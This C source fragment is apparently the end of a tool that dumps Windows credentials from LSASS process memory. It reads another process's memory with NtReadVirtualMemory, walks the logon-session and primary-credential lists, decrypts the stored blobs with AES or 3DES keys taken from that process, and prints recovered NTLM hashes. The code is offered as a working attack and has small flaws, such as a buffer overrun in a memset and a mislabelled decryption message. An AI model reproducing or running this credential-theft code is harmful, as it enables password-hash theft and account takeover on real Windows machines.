					// pcl = primary credential list
					// Each entry in the "credential list" linked list have a linked list of their own, called "primary credential list".
					// Now we are going to iterate over that list:

					char* pclFirstEntry = (char*)(*(uint64_t*)clEntryBuffer);
					clEntryBuffer = (char*)((DWORDLONG)clEntryBuffer + 8);

					char* pclEntry = pclFirstEntry;

					do {
						printf("    [+] Iterating over pclEntry: %llu\n", pclEntry);

						// Let's read the bytes of the entry
						bytesToRead = 0x2000;

						// Allocate some memory to hold the memory dump of target process
						void* pclEntryBuffer = malloc(bytesToRead);  // + 2 here since it's unicode (which takes up two bytes per characters, so trailing null should be two bytes as well)

						// clear buffer
						memset(pclEntryBuffer, 0, bytesToRead + 2);

						// Reading memory
						LONGLONG bytesRead7 = 0;
						status = NtReadVirtualMemory(hProcHandle, pclEntry, pclEntryBuffer, bytesToRead, (LPDWORD)&bytesRead7);

						if (status != 0) {
							printf("      [!] NtReadVirtualMemory of %p failed: %X\n", pos, status);
							return 1;
						}

						printf("      [+] NtReadVirtualMemory successfully read Primary Credential Memory Entry: %lu bytes\n", bytesRead7);

						char* pclEntryFlist = (char*)(*(uint64_t*)pclEntryBuffer);
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 8);

						uint8_t primaryLength = *(uint8_t*)pclEntryBuffer;
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 2);
						uint8_t primaryMaximumLength = *(uint8_t*)pclEntryBuffer;
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 2);

						char* buffer = (char*)pclEntryBuffer;
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 8);

						//printf("      length: %d\n", primaryLength);
						//printf("      maximumLength: %d\n", primaryMaximumLength);
						//printf("      buffer: %s\n", buffer);

						// there's an offset of 4
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 4);

						// And now, we get the encrypted Credential hash:

						uint16_t encryptedCredLength = *(uint16_t*)pclEntryBuffer;
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 2);

						uint16_t encryptedCredMaxLength = *(uint16_t*)pclEntryBuffer;
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 2);

						// there's an offset of 4, apparently
						pclEntryBuffer = (char*)((DWORDLONG)pclEntryBuffer + 4);

						// interpret 8 bytes as unsigned number, and treat that number as a pointer to a char array
						// this is actually a unicode string that holds the username.
						uint64_t pointerToEncryptedCred = *(uint64_t*)pclEntryBuffer;

						// Let's read 'length' bytes
						bytesToRead = encryptedCredLength;

						// Allocate some memory to hold the memory dump of target process
						void* encryptedCredBuffer = malloc(bytesToRead + 2); // + 2 here since it's unicode (which takes up two bytes per characters, so trailing null should be two bytes as well)

						// clear buffer
						memset(encryptedCredBuffer, 0, bytesToRead + 2);

						// Reading memory
						LONGLONG bytesRead8 = 0;

						status = NtReadVirtualMemory(hProcHandle, (char*)pointerToEncryptedCred, encryptedCredBuffer, bytesToRead, (LPDWORD)&bytesRead8);

						if (status != 0) {
							printf("      [!] NtReadVirtualMemory of %p failed: %X\n", pos, status);
							return 1;
						}

						printf("      [+] NtReadVirtualMemory successfully read Encrypted Credential memory: %lu bytes\n", bytesRead8);

						//wprintf(L"[+] encryptedCred: %s\n", (wchar_t*)encryptedCredBuffer);
						//hexprint((void*)encryptedCredBuffer, encryptedCredLength);

						// Final part, let's decrypt the encrypted Cred!
						if (encryptedCredLength == 0) {
							printf("      [!] Encrypted cred was empty?\n");
						}
						else {
							if (encryptedCredLength % 8 != 0) {
								printf("      [!] Encrypted cred was empty? Could be that it was orphaned / plaintext:\n");
								wprintf(L"      [ ] encryptedCred: %s\n", (wchar_t*)encryptedCredBuffer);
							}
							else {

								// some of the crypto stuff is common, so init that now.
								
								
								BCRYPT_ALG_HANDLE algorithmHandle;
								BCRYPT_KEY_HANDLE keyHandle;
								void* cleartext = malloc(encryptedCredLength + 10);
								memset(cleartext, 0, encryptedCredLength + 10);

								ULONG result;

								unsigned char tempIV[16];

								// Same IV used for each decryption attempt, and it'll get overwriting during each by the decryption
								// library, so make a local copy each time, to preserve the original
								memcpy(tempIV, IVptr, 16);

								if (encryptedCredLength % 16 == 0) {
									printf("      [ ] The length of the Encrypted Credential indicates that it'a  16-byte block,\n");
									printf("          and therefore has been encrypted with AES in CBC mode.\n");
									
									
									BCryptOpenAlgorithmProvider(&algorithmHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
									BCryptSetProperty(algorithmHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
									BCryptGenerateSymmetricKey(algorithmHandle, &keyHandle, NULL, 0, (PUCHAR)AESkeyDataAddr, AESkeyLength, 0);
									
									status = BCryptDecrypt(keyHandle, (PUCHAR)encryptedCredBuffer, encryptedCredLength, 0, (PUCHAR)tempIV, 16, (PUCHAR)cleartext, encryptedCredLength, &result, 0);
									
									if (status != 0) {
										printf("      [!] AES decrypt failed: %d\n", status);
										return 0;
									}

									printf("      [+] Decrypting 3DES succeeded\n");
									//hexprint(cleartext, encryptedCredLength);

								}
								else if (encryptedCredLength % 8 == 0) {
									// 3DES CBC mode
									printf("      [ ] The length of the Encrypted Credential indicates that it'a  8-byte block,\n");
									printf("          and therefore has been encrypted with 3DES in CBC mode.\n");

									BCryptOpenAlgorithmProvider(&algorithmHandle, BCRYPT_3DES_ALGORITHM, NULL, 0);
									BCryptSetProperty(algorithmHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
									BCryptGenerateSymmetricKey(algorithmHandle, &keyHandle, NULL, 0, (PUCHAR)DESkeyDataAddr, DESkeyLength, 0);

									status = BCryptDecrypt(keyHandle, (PUCHAR)encryptedCredBuffer, encryptedCredLength, 0, (PUCHAR)tempIV, 8, (PUCHAR)cleartext, encryptedCredLength, &result, 0);
									
									if (status != 0) {
										printf("      [!] 3DES decrypt failed: %d\n", status);
										return 1;
									}

									printf("      [+] Decrypting 3DES succeeded\n");

								}
								else {
									printf("      [!] Encrypted cred is not in either 16 (aes) or 8 (3des) block size!\n");
									return 1;
								}

								//hexprint(cleartext, encryptedCredLength);
								
								// offset 74 found by just checking the buffer and seeing where it is
								void* ntlm = (void*)((DWORDLONG)cleartext + 74);
								
								SetConsoleTextAttribute(hConsole, 10); // set color to green
								printf("      [+] NTLM: ");
								
								for (int i = 0; i < 16; ++i) {
									printf("%02hhx", *(unsigned char*)((DWORDLONG)ntlm + i));
								}
								printf("\n");

								SetConsoleTextAttribute(hConsole, 7); // set color back to grey

								free(cleartext);

							}
						}

						free(encryptedCredBuffer);

						pclEntry = pclEntryFlist;

						printf("\n");

					} while ((pclEntry != pclFirstEntry) && (pclEntry != 0));

					printf("    [+] No more Primary Credential List entries to iterate over\n");

					clEntry = clEntryFlist;

				} while ((clEntry != clFirstEntry) && (clEntry != 0));
				printf("  [+] No more Credential List entries to iterate over\n");
			}
			
			if (firstEntry == flink) {
				printf("[+] After %d iterations: We have iterated the entire linked list!\n", iterations);
				printf("    The next entry is the one we started on. Breaking...\n");
				break;
			}

			value = flink;
		}

	}
	
	printf("[+] No more logonsessionsdone\n");
	
	return 0;
}
